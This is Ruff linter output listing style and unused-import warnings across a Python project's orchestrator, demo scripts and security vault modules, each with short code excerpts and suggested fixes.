UP035 `typing.Dict` is deprecated, use `dict` instead
 --> project_ai\orchestrator\boot_sequence.py:7:1
  |
6 | import logging
7 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
8 |
9 | from .subsystems import (
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\boot_sequence.py:21:32
   |
19 |     """Manages startup of all Sovereign Stack subsystems"""
20 |
21 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
22 |         self.logger = logging.getLogger(__name__)
23 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> project_ai\orchestrator\boot_sequence.py:124:29
    |
122 |             )
123 |
124 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
125 |         """Get comprehensive status of all subsystems"""
126 |         return {
    |
help: Replace with `dict`

F401 [*] `time` imported but unused
 --> project_ai\orchestrator\health_monitor.py:7:8
  |
6 | import logging
7 | import time
  |        ^^^^
8 | from threading import Event, Thread
9 | from typing import Any, Dict
  |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> project_ai\orchestrator\health_monitor.py:9:1
  |
7 | import time
8 | from threading import Event, Thread
9 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.Any` imported but unused
 --> project_ai\orchestrator\health_monitor.py:9:20
  |
7 | import time
8 | from threading import Event, Thread
9 | from typing import Any, Dict
  |                    ^^^
  |
help: Remove unused import

F401 [*] `typing.Dict` imported but unused
 --> project_ai\orchestrator\health_monitor.py:9:25
  |
7 | import time
8 | from threading import Event, Thread
9 | from typing import Any, Dict
  |                         ^^^^
  |
help: Remove unused import

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> project_ai\orchestrator\subsystems\cerberus_integration.py:9:1
   |
 7 | import sys
 8 | from pathlib import Path
 9 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | # Add Cerberus to path
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\cerberus_integration.py:37:32
   |
35 |     """Integrates Cerberus multi-agent security framework"""
36 |
37 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
38 |         self.logger = logging.getLogger(__name__)
39 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\cerberus_integration.py:92:29
   |
90 |         self.logger.info("Cerberus stopped")
91 |
92 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
93 |         """Get comprehensive Cerberus status"""
94 |         if not CERBERUS_AVAILABLE or not self.hub:
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> project_ai\orchestrator\subsystems\cerberus_integration.py:113:49
    |
111 |         }
112 |
113 |     def analyze_input(self, user_input: str) -> Dict[str, Any]:
    |                                                 ^^^^
114 |         """Analyze input for threats (main API)"""
115 |         if not CERBERUS_AVAILABLE or not self.hub:
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> project_ai\orchestrator\subsystems\monolith_integration.py:9:1
   |
 7 | import sys
 8 | from pathlib import Path
 9 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | # Add Monolith to path
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\monolith_integration.py:32:32
   |
30 |     """Integrates Thirstys-Monolith schematic guardian and policy enforcement"""
31 |
32 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
33 |         self.logger = logging.getLogger(__name__)
34 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\monolith_integration.py:90:29
   |
88 |         self.active = False
89 |
90 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
91 |         """Get Monolith status"""
92 |         return {
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> project_ai\orchestrator\subsystems\thirsty_lang_integration.py:9:1
  |
7 | import subprocess
8 | from pathlib import Path
9 | from typing import Any, Dict, Optional
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

F401 [*] `typing.Optional` imported but unused
 --> project_ai\orchestrator\subsystems\thirsty_lang_integration.py:9:31
  |
7 | import subprocess
8 | from pathlib import Path
9 | from typing import Any, Dict, Optional
  |                               ^^^^^^^^
  |
help: Remove unused import: `typing.Optional`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\thirsty_lang_integration.py:15:32
   |
13 |     """Integrates Thirsty-Lang programming language"""
14 |
15 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
16 |         self.logger = logging.getLogger(__name__)
17 |         self.config = config or {}
   |
help: Replace with `dict`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> project_ai\orchestrator\subsystems\thirsty_lang_integration.py:44:13
   |
42 |         except (subprocess.TimeoutExpired, FileNotFoundError) as e:
43 |             self.logger.error(f"Node.js not found or not responding: {e}")
44 |             raise RuntimeError(f"Node.js not found: {e}")
   |             ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
45 |
46 |         # Verify Thirsty-Lang CLI exists
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> project_ai\orchestrator\subsystems\thirsty_lang_integration.py:108:29
    |
106 |                 temp_file.unlink()
107 |
108 |     def get_status(self) -> Dict[str, Any]:
    |                             ^^^^
109 |         """Get Thirsty-Lang status"""
110 |         return {
    |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
 --> project_ai\orchestrator\subsystems\triumvirate_integration.py:8:1
  |
6 | import logging
7 | from pathlib import Path
8 | from typing import Any, Dict
  | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
  |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\triumvirate_integration.py:14:32
   |
12 |     """Integrates The_Triumvirate documentation website"""
13 |
14 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
15 |         self.logger = logging.getLogger(__name__)
16 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\triumvirate_integration.py:54:29
   |
52 |         self.active = False
53 |
54 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
55 |         """Get Triumvirate status"""
56 |         return {
   |
help: Replace with `dict`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> project_ai\orchestrator\subsystems\waterfall_integration.py:9:1
   |
 7 | import sys
 8 | from pathlib import Path
 9 | from typing import Any, Dict
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^
10 |
11 | # Add Waterfall to path
   |

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\waterfall_integration.py:29:32
   |
27 |     """Integrates Thirstys-Waterfall VPN, firewalls, and secure browser"""
28 |
29 |     def __init__(self, config: Dict[str, Any] = None):
   |                                ^^^^
30 |         self.logger = logging.getLogger(__name__)
31 |         self.config = config or {}
   |
help: Replace with `dict`

UP006 [*] Use `dict` instead of `Dict` for type annotation
  --> project_ai\orchestrator\subsystems\waterfall_integration.py:93:29
   |
91 |         self.active = False
92 |
93 |     def get_status(self) -> Dict[str, Any]:
   |                             ^^^^
94 |         """Get comprehensive Waterfall status"""
95 |         if not WATERFALL_AVAILABLE or not self.waterfall:
   |
help: Replace with `dict`

SIM102 Use a single `if` statement instead of nested `if` statements
   --> project_ai\tarl\integrations\orchestration_extended.py:830:13
    |
828 |           candidates = []
829 |           for node in self._nodes.values():
830 | /             if all(cap in node.capabilities for cap in required_capabilities):
831 | |                 if node.load < node.max_load:
    | |_____________________________________________^
832 |                       candidates.append(node)
    |
help: Combine `if` statements using `and`

F401 [*] `pathlib.Path` imported but unused
  --> scripts\apply_safe_framing.py:21:21
   |
19 | import re
20 | import sys
21 | from pathlib import Path
   |                     ^^^^
22 | from typing import List, Tuple
   |
help: Remove unused import: `pathlib.Path`

UP035 `typing.List` is deprecated, use `list` instead
  --> scripts\apply_safe_framing.py:22:1
   |
20 | import sys
21 | from pathlib import Path
22 | from typing import List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | DISCLAIMER_TEMPLATE = """---
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> scripts\apply_safe_framing.py:22:1
   |
20 | import sys
21 | from pathlib import Path
22 | from typing import List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
23 |
24 | DISCLAIMER_TEMPLATE = """---
   |

UP006 [*] Use `tuple` instead of `Tuple` for type annotation
   --> scripts\apply_safe_framing.py:122:65
    |
120 |         ]
121 |
122 |     def transform_content(self, content: str, filename: str) -> Tuple[str, List[str]]:
    |                                                                 ^^^^^
123 |         """
124 |         Transform content to use safe framing language
    |
help: Replace with `tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> scripts\apply_safe_framing.py:122:76
    |
120 |         ]
121 |
122 |     def transform_content(self, content: str, filename: str) -> Tuple[str, List[str]]:
    |                                                                            ^^^^
123 |         """
124 |         Transform content to use safe framing language
    |
help: Replace with `list`

UP015 [*] Unnecessary mode argument
   --> scripts\apply_safe_framing.py:169:33
    |
168 |         try:
169 |             with open(filepath, "r", encoding="utf-8") as f:
    |                                 ^^^
170 |                 original_content = f.read()
171 |         except Exception as e:
    |
help: Remove mode argument

F541 [*] f-string without any placeholders
   --> scripts\apply_safe_framing.py:190:15
    |
188 |         diff_lines = new_lines - original_lines
189 |
190 |         print(f"\nStatistics:")
    |               ^^^^^^^^^^^^^^^^
191 |         print(f"  Original lines: {original_lines}")
192 |         print(f"  New lines: {new_lines}")
    |
help: Remove extraneous `f` prefix

UP015 [*] Unnecessary mode argument
   --> scripts\apply_safe_framing.py:198:33
    |
196 |         """Apply safe framing changes to a file"""
197 |         try:
198 |             with open(filepath, "r", encoding="utf-8") as f:
    |                                 ^^^
199 |                 original_content = f.read()
200 |         except Exception as e:
    |
help: Remove mode argument

SIM108 Use ternary operator `files = [args.file] if args.file else glob.glob("docs/whitepapers/*.md")` instead of `if`-`else`-block
   --> scripts\apply_safe_framing.py:249:5
    |
248 |       # Determine files to process
249 | /     if args.file:
250 | |         files = [args.file]
251 | |     else:
252 | |         files = glob.glob("docs/whitepapers/*.md")
    | |__________________________________________________^
253 |
254 |       if not files:
    |
help: Replace `if`-`else`-block with `files = [args.file] if args.file else glob.glob("docs/whitepapers/*.md")`

E741 Ambiguous variable name: `l`
   --> scripts\demo\demo_global_scenario_engine.py:112:49
    |
110 |     print(f"Γ£ô Causal model built: {len(causal_links)} causal links")
111 |     print("\nKey causal relationships:")
112 |     for link in sorted(causal_links, key=lambda l: l.strength, reverse=True)[:5]:
    |                                                 ^
113 |         print(f"  ΓÇó {link.source} ΓåÆ {link.target}")
114 |         print(f"    Strength: {link.strength:.2f}, Lag: {link.lag_years:.1f} years")
    |

E722 Do not use bare `except`
   --> scripts\demo\demo_tarl_productivity.py:123:17
    |
121 |                     runtime.evaluate(context)
122 |                     evaluation_count += 1
123 |                 except:
    |                 ^^^^^^
124 |                     pass
    |

E722 Do not use bare `except`
   --> scripts\demo\demo_tarl_productivity.py:169:9
    |
167 |         try:
168 |             runtime.evaluate(context)
169 |         except:
    |         ^^^^^^
170 |             pass
    |

F541 [*] f-string without any placeholders
  --> scripts\demos\demo_explainability.py:60:15
   |
58 |         print(f"Timestamp: {explanation.timestamp}")
59 |         print(f"\nSummary: {explanation.summary}")
60 |         print(f"\nDetailed Reasoning:")
   |               ^^^^^^^^^^^^^^^^^^^^^^^^
61 |         for step in explanation.detailed_reasoning:
62 |             print(f"  {step}")
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
  --> scripts\demos\demo_explainability.py:64:15
   |
62 |             print(f"  {step}")
63 |
64 |         print(f"\nFour Laws Evaluation:")
   |               ^^^^^^^^^^^^^^^^^^^^^^^^^^
65 |         for law, satisfied in explanation.laws_evaluated.items():
66 |             status = "Γ£ô SATISFIED" if satisfied else "Γ£ù VIOLATED"
   |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> scripts\demos\demo_explainability.py:99:15
    |
 97 |             },
 98 |         )
 99 |         print(f"   Γ£ù Action should have been blocked!")
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
100 |     except Exception as e:
101 |         print(f"   Γ£ô Action correctly blocked: {type(e).__name__}")
    |
help: Remove extraneous `f` prefix

F541 [*] f-string without any placeholders
   --> scripts\demos\demo_explainability.py:118:23
    |
116 |                 print("=" * 60)
117 |                 print(f"\nSummary: {explanation.summary}")
118 |                 print(f"\nFour Laws Evaluation:")
    |                       ^^^^^^^^^^^^^^^^^^^^^^^^^^
119 |                 for law, satisfied in explanation.laws_evaluated.items():
120 |                     status = "Γ£ô" if satisfied else "Γ£ù VIOLATED"
    |
help: Remove extraneous `f` prefix

F401 [*] `pathlib.Path` imported but unused
  --> scripts\demos\rainbow_csv_visualizer.py:10:21
   |
 8 | import json
 9 | import time
10 | from pathlib import Path
   |                     ^^^^
11 |
12 | # Real Bridge logic
   |
help: Remove unused import: `pathlib.Path`

UP015 [*] Unnecessary mode argument
  --> scripts\demos\rainbow_csv_visualizer.py:42:30
   |
41 |     try:
42 |         with open(file_path, "r", encoding="utf-8") as f:
   |                              ^^^
43 |             reader = csv.DictReader(f)
   |
help: Remove mode argument

SIM102 Use a single `if` statement instead of nested `if` statements
  --> scripts\fix_logging_performance.py:71:9
   |
69 |               ):
70 |                   return True
71 | /         elif isinstance(node.func, ast.Name):
72 | |             # logging.info(), logging.error(), etc.
73 | |             if node.func.id in ("debug", "info", "warning", "error", "critical", "log"):
   | |________________________________________________________________________________________^
74 |                   return True
75 |           return False
   |
help: Combine `if` statements using `and`

F821 Undefined name `Any`
  --> scripts\freeze_seal.py:67:69
   |
65 |         logger.info("ConstitutionSealer initialized at %s", self.data_dir)
66 |
67 |     def validate_10_year_convergence(self) -> tuple[bool, dict[str, Any]]:
   |                                                                     ^^^
68 |         """
69 |         Validate 10-year convergence criteria.
   |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:103:67
    |
101 |         return True, {"passes": True, "metadata": metadata}
102 |
103 |     def validate_entropy_stability(self) -> tuple[bool, dict[str, Any]]:
    |                                                                   ^^^
104 |         """
105 |         Validate entropy stability (no creep or collapse).
    |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:141:66
    |
139 |         }
140 |
141 |     def validate_ledger_integrity(self) -> tuple[bool, dict[str, Any]]:
    |                                                                  ^^^
142 |         """
143 |         Validate all ledger hash chains are intact.
    |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:188:62
    |
186 |         }
187 |
188 |     def validate_system_state(self) -> tuple[bool, dict[str, Any]]:
    |                                                              ^^^
189 |         """
190 |         Validate system is in valid state for completion.
    |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:215:55
    |
213 |         }
214 |
215 |     def run_validation(self) -> tuple[bool, dict[str, Any]]:
    |                                                       ^^^
216 |         """
217 |         Run all validation checks.
    |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:266:72
    |
264 |         return all_pass, validation_results
265 |
266 |     def _record_validation_attempt(self, validation_results: dict[str, Any]):
    |                                                                        ^^^
267 |         """Record validation attempt to ledger"""
268 |         with open(self.completion_ledger_path, "a") as f:
    |

F821 Undefined name `Any`
   --> scripts\freeze_seal.py:272:45
    |
271 |     def generate_completion_seal(
272 |         self, validation_results: dict[str, Any]
    |                                             ^^^
273 |     ) -> dict[str, str]:
274 |         """
    |

N999 Invalid module name: 'install-shortcuts'
--> scripts\install-shortcuts.py:1:1

F401 [*] `datetime.datetime` imported but unused
  --> scripts\maintenance\verify_system.py:9:22
   |
 7 | import os
 8 | import sys
 9 | from datetime import datetime
   |                      ^^^^^^^^
10 |
11 | # Set up logging
   |
help: Remove unused import: `datetime.datetime`

F401 [*] `app.security.asymmetric_enforcement_gateway.OperationRequest` imported but unused
  --> scripts\maintenance\verify_system.py:81:9
   |
79 | def check_hydra_integration():
80 |     from app.security.asymmetric_enforcement_gateway import (
81 |         OperationRequest,
   |         ^^^^^^^^^^^^^^^^
82 |         OperationType,
83 |         SecurityEnforcementGateway,
   |
help: Remove unused import

F401 [*] `app.security.asymmetric_enforcement_gateway.OperationType` imported but unused
  --> scripts\maintenance\verify_system.py:82:9
   |
80 |     from app.security.asymmetric_enforcement_gateway import (
81 |         OperationRequest,
82 |         OperationType,
   |         ^^^^^^^^^^^^^
83 |         SecurityEnforcementGateway,
84 |     )
   |
help: Remove unused import

F841 Local variable `gateway` is assigned to but never used
  --> scripts\maintenance\verify_system.py:86:5
   |
84 |     )
85 |
86 |     gateway = SecurityEnforcementGateway()
   |     ^^^^^^^
87 |
88 |     # Needs to fail a check to trigger Hydra
   |
help: Remove assignment to unused variable `gateway`

E402 Module level import not at top of file
  --> scripts\register_legion_moltbook.py:16:1
   |
15 | # Now import
16 | from integrations.openclaw.moltbook_client import register_legion
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

E402 Module level import not at top of file
  --> scripts\run_security_worker.py:19:1
   |
17 | sys.path.insert(0, str(project_root))
18 |
19 | from temporalio.client import Client
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
20 | from temporalio.worker import Worker
   |

E402 Module level import not at top of file
  --> scripts\run_security_worker.py:20:1
   |
19 | from temporalio.client import Client
20 | from temporalio.worker import Worker
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
21 |
22 | # Import shared activities
   |

E402 Module level import not at top of file
  --> scripts\run_security_worker.py:23:1
   |
22 | # Import shared activities
23 | from temporal.workflows.activities import record_telemetry
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
24 |
25 | # Import workflows and activities
   |

E402 Module level import not at top of file
  --> scripts\run_security_worker.py:26:1
   |
25 |   # Import workflows and activities
26 | / from temporal.workflows.security_agent_activities import (
27 | |     block_deployment,
28 | |     generate_sarif_report,
29 | |     generate_security_patches,
30 | |     run_code_vulnerability_scan,
31 | |     run_constitutional_reviews,
32 | |     run_red_team_campaign,
33 | |     run_safety_benchmark,
34 | |     trigger_incident_workflow,
35 | |     trigger_security_alert,
36 | | )
   | |_^
37 |   from temporal.workflows.security_agent_workflows import (
38 |       CodeSecuritySweepWorkflow,
   |

E402 Module level import not at top of file
  --> scripts\run_security_worker.py:37:1
   |
35 |       trigger_security_alert,
36 |   )
37 | / from temporal.workflows.security_agent_workflows import (
38 | |     CodeSecuritySweepWorkflow,
39 | |     ConstitutionalMonitoringWorkflow,
40 | |     RedTeamCampaignWorkflow,
41 | |     SafetyTestingWorkflow,
42 | | )
   | |_^
43 |
44 |   # Configure logging
   |

F401 [*] `time` imported but unused
 --> scripts\test_emergent_services.py:6:8
  |
4 | """
5 |
6 | import time
  |        ^^^^
7 |
8 | import requests
  |
help: Remove unused import: `time`

F401 [*] `requests` imported but unused
  --> scripts\test_emergent_services.py:8:8
   |
 6 | import time
 7 |
 8 | import requests
   |        ^^^^^^^^
 9 |
10 | SERVICES = {
   |
help: Remove unused import: `requests`

F401 [*] `typing.Any` imported but unused
  --> scripts\validate_all_code.py:28:20
   |
26 | from datetime import datetime
27 | from pathlib import Path
28 | from typing import Any
   |                    ^^^
   |
help: Remove unused import: `typing.Any`

F541 [*] f-string without any placeholders
   --> scripts\validate_all_code.py:283:15
    |
281 |     def run_all(self) -> int:
282 |         """Run all validation checks and return exit code."""
283 |         print(f"\n≡ƒÜÇ Starting Comprehensive Code Validation")
    |               ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
284 |         print(f"Mode: {'Fix' if self.fix else 'Check'}")
285 |         print(f"Speed: {'Fast' if self.fast else 'Full'}")
    |
help: Remove extraneous `f` prefix

F401 [*] `pathlib.Path` imported but unused
  --> scripts\validate_production_claims.py:24:21
   |
22 | import re
23 | import sys
24 | from pathlib import Path
   |                     ^^^^
25 | from typing import Dict, List, Tuple
   |
help: Remove unused import: `pathlib.Path`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> scripts\validate_production_claims.py:25:1
   |
23 | import sys
24 | from pathlib import Path
25 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
26 |
27 | # Prohibited claim patterns from SECURITY_VALIDATION_POLICY.md
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> scripts\validate_production_claims.py:25:1
   |
23 | import sys
24 | from pathlib import Path
25 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
26 |
27 | # Prohibited claim patterns from SECURITY_VALIDATION_POLICY.md
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> scripts\validate_production_claims.py:25:1
   |
23 | import sys
24 | from pathlib import Path
25 | from typing import Dict, List, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
26 |
27 | # Prohibited claim patterns from SECURITY_VALIDATION_POLICY.md
   |

F401 [*] `typing.Tuple` imported but unused
  --> scripts\validate_production_claims.py:25:32
   |
23 | import sys
24 | from pathlib import Path
25 | from typing import Dict, List, Tuple
   |                                ^^^^^
26 |
27 | # Prohibited claim patterns from SECURITY_VALIDATION_POLICY.md
   |
help: Remove unused import: `typing.Tuple`

UP006 [*] Use `list` instead of `List` for type annotation
   --> scripts\validate_production_claims.py:134:33
    |
134 | def scan_file(filepath: str) -> List[Violation]:
    |                                 ^^^^
135 |     """Scan a single file for policy violations"""
136 |     violations = []
    |
help: Replace with `list`

UP015 [*] Unnecessary mode argument
   --> scripts\validate_production_claims.py:139:29
    |
138 |     try:
139 |         with open(filepath, "r", encoding="utf-8") as f:
    |                             ^^^
140 |             lines = f.readlines()
141 |     except Exception as e:
    |
help: Remove mode argument

UP006 [*] Use `list` instead of `List` for type annotation
   --> scripts\validate_production_claims.py:166:33
    |
166 | def generate_report(violations: List[Violation], output_format: str = "text") -> str:
    |                                 ^^^^
167 |     """Generate a formatted report"""
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> scripts\validate_production_claims.py:177:14
    |
176 |     # Group by file
177 |     by_file: Dict[str, List[Violation]] = {}
    |              ^^^^
178 |     for v in violations:
179 |         if v.filepath not in by_file:
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> scripts\validate_production_claims.py:177:24
    |
176 |     # Group by file
177 |     by_file: Dict[str, List[Violation]] = {}
    |                        ^^^^
178 |     for v in violations:
179 |         if v.filepath not in by_file:
    |
help: Replace with `list`

F541 [*] f-string without any placeholders
   --> scripts\validate_production_claims.py:199:18
    |
197 |     lines.append(f"  Total Violations: {len(violations)}")
198 |     lines.append(f"  Files Affected: {len(by_file)}")
199 |     lines.append(f"  Severity Breakdown:")
    |                  ^^^^^^^^^^^^^^^^^^^^^^^^
200 |     for severity in ["CRITICAL", "HIGH", "MEDIUM", "LOW"]:
201 |         count = severity_counts.get(severity, 0)
    |
help: Remove extraneous `f` prefix

E741 Ambiguous variable name: `l`
   --> scripts\verify\god_tier_verification.py:264:31
    |
262 |         with open(codeowners) as f:
263 |             lines = [
264 |                 l.strip() for l in f.readlines() if l.strip() and not l.startswith("#")
    |                               ^
265 |             ]
    |

F401 [*] `time` imported but unused
  --> security\black_vault.py:25:8
   |
23 | import os
24 | import threading
25 | import time
   |        ^^^^
26 | from datetime import datetime, timedelta
27 | from pathlib import Path
   |
help: Remove unused import: `time`

UP035 `typing.Dict` is deprecated, use `dict` instead
  --> security\black_vault.py:28:1
   |
26 | from datetime import datetime, timedelta
27 | from pathlib import Path
28 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | from cryptography.fernet import Fernet
   |

UP035 `typing.List` is deprecated, use `list` instead
  --> security\black_vault.py:28:1
   |
26 | from datetime import datetime, timedelta
27 | from pathlib import Path
28 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | from cryptography.fernet import Fernet
   |

UP035 `typing.Tuple` is deprecated, use `tuple` instead
  --> security\black_vault.py:28:1
   |
26 | from datetime import datetime, timedelta
27 | from pathlib import Path
28 | from typing import Any, Dict, List, Optional, Tuple
   | ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
29 |
30 | from cryptography.fernet import Fernet
   |

F401 [*] `typing.Tuple` imported but unused
  --> security\black_vault.py:28:47
   |
26 | from datetime import datetime, timedelta
27 | from pathlib import Path
28 | from typing import Any, Dict, List, Optional, Tuple
   |                                               ^^^^^
29 |
30 | from cryptography.fernet import Fernet
   |
help: Remove unused import: `typing.Tuple`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
  --> security\black_vault.py:70:9
   |
68 |     except Exception as e:
69 |         logger.critical(f"Invalid VAULT_KEY format: {e}")
70 |         raise RuntimeError(f"VAULT_KEY must be valid base64: {e}")
   |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
   |

SIM102 Use a single `if` statement instead of nested `if` statements
   --> security\black_vault.py:104:5
    |
102 |       rotate_requested = os.environ.get("ROTATE_KEY", "").lower() in ("true", "1", "yes")
103 |
104 | /     if not force and not rotate_requested:
105 | |         # Check rotation schedule
106 | |         if rotation_file.exists():
    | |__________________________________^
107 |               try:
108 |                   with open(rotation_file, "r") as f:
    |
help: Combine `if` statements using `and`

UP015 [*] Unnecessary mode argument
   --> security\black_vault.py:108:42
    |
106 |         if rotation_file.exists():
107 |             try:
108 |                 with open(rotation_file, "r") as f:
    |                                          ^^^
109 |                     rotation_data = json.load(f)
110 |                     last_rotation = datetime.fromisoformat(
    |
help: Remove mode argument

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\black_vault.py:206:9
    |
204 |     except Exception as e:
205 |         logger.error(f"Vault key rotation failed: {e}")
206 |         raise VaultKeyRotationError(f"Failed to rotate vault key: {e}")
    |         ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
    |

UP045 [*] Use `X | None` for type annotations
   --> security\black_vault.py:223:28
    |
222 |     def __init__(
223 |         self, vault_store: Optional[str] = None, max_size: Optional[int] = None
    |                            ^^^^^^^^^^^^^
224 |     ):
225 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> security\black_vault.py:223:60
    |
222 |     def __init__(
223 |         self, vault_store: Optional[str] = None, max_size: Optional[int] = None
    |                                                            ^^^^^^^^^^^^^
224 |     ):
225 |         """
    |
help: Convert to `X | None`

UP045 [*] Use `X | None` for type annotations
   --> security\black_vault.py:306:48
    |
305 |     def deny(
306 |         self, doc: str, reason: str, metadata: Optional[Dict[str, Any]] = None
    |                                                ^^^^^^^^^^^^^^^^^^^^^^^^
307 |     ) -> str:
308 |         """
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\black_vault.py:306:57
    |
305 |     def deny(
306 |         self, doc: str, reason: str, metadata: Optional[Dict[str, Any]] = None
    |                                                         ^^^^
307 |     ) -> str:
308 |         """
    |
help: Replace with `dict`

B904 Within an `except` clause, raise exceptions with `raise ... from err` or `raise ... from None` to distinguish them from errors in exception handling
   --> security\black_vault.py:374:17
    |
372 |             except Exception as e:
373 |                 logger.error(f"Failed to write to vault: {e}")
374 |                 raise VaultStorageError(f"Failed to store content in vault: {e}")
    |                 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
375 |
376 |     def retrieve(self, vault_id: str) -> Optional[Dict[str, Any]]:
    |

UP045 [*] Use `X | None` for type annotations
   --> security\black_vault.py:376:42
    |
374 |                 raise VaultStorageError(f"Failed to store content in vault: {e}")
375 |
376 |     def retrieve(self, vault_id: str) -> Optional[Dict[str, Any]]:
    |                                          ^^^^^^^^^^^^^^^^^^^^^^^^
377 |         """
378 |         Retrieve content from vault by ID (requires authorization).
    |
help: Convert to `X | None`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\black_vault.py:376:51
    |
374 |                 raise VaultStorageError(f"Failed to store content in vault: {e}")
375 |
376 |     def retrieve(self, vault_id: str) -> Optional[Dict[str, Any]]:
    |                                                   ^^^^
377 |         """
378 |         Retrieve content from vault by ID (requires authorization).
    |
help: Replace with `dict`

UP006 [*] Use `list` instead of `List` for type annotation
   --> security\black_vault.py:409:49
    |
407 |         return None
408 |
409 |     def list_entries(self, limit: int = 100) -> List[Dict[str, Any]]:
    |                                                 ^^^^
410 |         """
411 |         List vault entries (metadata only, no content).
    |
help: Replace with `list`

UP006 [*] Use `dict` instead of `Dict` for type annotation
   --> security\black_vault.py:409:54
    |
407 |         return None
408 |
409 |     def list_entries(self, limit: int = 100) -> List[Dict[str, Any]]:
